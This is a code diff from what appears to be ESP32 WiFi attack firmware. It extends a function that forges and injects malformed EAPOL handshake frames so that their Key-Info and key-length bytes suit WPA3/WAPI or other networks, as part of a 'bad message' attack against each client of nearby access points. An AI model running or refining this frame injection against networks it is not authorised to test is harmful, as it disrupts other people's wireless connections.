@@ -6424,7 +6424,7 @@ void WiFiScan::sendDeauthFrame(uint8_t bssid[6], int channel, String dst_mac_str
   packets_sent = packets_sent + 3;
 }
 
-void WiFiScan::sendEapolBagMsg1(uint8_t bssid[6], int channel, uint8_t mac[6]) {
+void WiFiScan::sendEapolBagMsg1(uint8_t bssid[6], int channel, uint8_t mac[6], uint8_t sec) {
   WiFiScan::set_channel = channel;
   esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
   delay(1);
@@ -6460,6 +6460,17 @@ void WiFiScan::sendEapolBagMsg1(uint8_t bssid[6], int channel, uint8_t mac[6]) {
     eapol_packet_bad_msg1[41 + i] = (packets_sent >> (56 - i * 8)) & 0xFF;
   }
 
+  if(sec == WIFI_SECURITY_WPA3 || sec == WIFI_SECURITY_WPA3_ENTERPRISE || sec == WIFI_SECURITY_WAPI) {
+    eapol_packet_bad_msg1[38] = 0xCB;      // Key‑Info (LSB)  Install|Ack|Pairwise, ver=3
+    eapol_packet_bad_msg1[39] = 0x00;      // Key Length MSB
+    eapol_packet_bad_msg1[40] = 0x00;      // Key Length LSB   (must be 0 with GCMP)
+  }
+  else {
+    eapol_packet_bad_msg1[38] = 0xCA;      // Key‑Info (LSB)  Install|Ack|Pairwise, ver=3
+    eapol_packet_bad_msg1[39] = 0x00;      // Key Length MSB
+    eapol_packet_bad_msg1[40] = 0x10;      // Key Length LSB   (must be 0 with GCMP)
+  }
+
   // Send packet
   esp_wifi_80211_tx(WIFI_IF_AP, eapol_packet_bad_msg1, sizeof(eapol_packet_bad_msg1), false);
   //esp_wifi_80211_tx(WIFI_IF_AP, eapol_packet_bad_msg1, sizeof(eapol_packet_bad_msg1), false);
@@ -6468,7 +6479,7 @@ void WiFiScan::sendEapolBagMsg1(uint8_t bssid[6], int channel, uint8_t mac[6]) {
   packets_sent = packets_sent + 1;
 }
 
-void WiFiScan::sendEapolBagMsg1(uint8_t bssid[6], int channel, String dst_mac_str) {
+void WiFiScan::sendEapolBagMsg1(uint8_t bssid[6], int channel, String dst_mac_str, uint8_t sec) {
   WiFiScan::set_channel = channel;
   esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
   delay(1);
@@ -6500,6 +6511,17 @@ void WiFiScan::sendEapolBagMsg1(uint8_t bssid[6], int channel, String dst_mac_st
     eapol_packet_bad_msg1[41 + i] = (packets_sent >> (56 - i * 8)) & 0xFF;
   }
 
+  if(sec == WIFI_SECURITY_WPA3 || sec == WIFI_SECURITY_WPA3_ENTERPRISE || sec == WIFI_SECURITY_WAPI) {
+    eapol_packet_bad_msg1[38] = 0xCB;      // Key‑Info (LSB)  Install|Ack|Pairwise, ver=3
+    eapol_packet_bad_msg1[39] = 0x00;      // Key Length MSB
+    eapol_packet_bad_msg1[40] = 0x00;      // Key Length LSB   (must be 0 with GCMP)
+  }
+  else {
+    eapol_packet_bad_msg1[38] = 0xCA;      // Key‑Info (LSB)  Install|Ack|Pairwise, ver=3
+    eapol_packet_bad_msg1[39] = 0x00;      // Key Length MSB
+    eapol_packet_bad_msg1[40] = 0x10;      // Key Length LSB   (must be 0 with GCMP)
+  }
+
   // Send packet
   esp_wifi_80211_tx(WIFI_IF_AP, eapol_packet_bad_msg1, sizeof(eapol_packet_bad_msg1), false);
   esp_wifi_80211_tx(WIFI_IF_AP, eapol_packet_bad_msg1, sizeof(eapol_packet_bad_msg1), false);
@@ -6516,7 +6538,8 @@ void WiFiScan::sendBadMsgAttack(uint32_t currentTime, bool all) {
           //for (int s = 0; s < 20; s++) {
             this->sendEapolBagMsg1(access_points->get(i).bssid,
                                     access_points->get(i).channel,
-                                    stations->get(access_points->get(i).stations->get(x)).mac);
+                                    stations->get(access_points->get(i).stations->get(x)).mac,
+                                    access_points->get(i).sec);
           //}
         }
       }
@@ -6529,7 +6552,8 @@ void WiFiScan::sendBadMsgAttack(uint32_t currentTime, bool all) {
           //for (int s = 0; s < 20; s++) {
             this->sendEapolBagMsg1(access_points->get(i).bssid,
                                     access_points->get(i).channel,
-                                    stations->get(access_points->get(i).stations->get(x)).mac);
+                                    stations->get(access_points->get(i).stations->get(x)).mac,
+                                    access_points->get(i).sec);
           //}
         }
       }
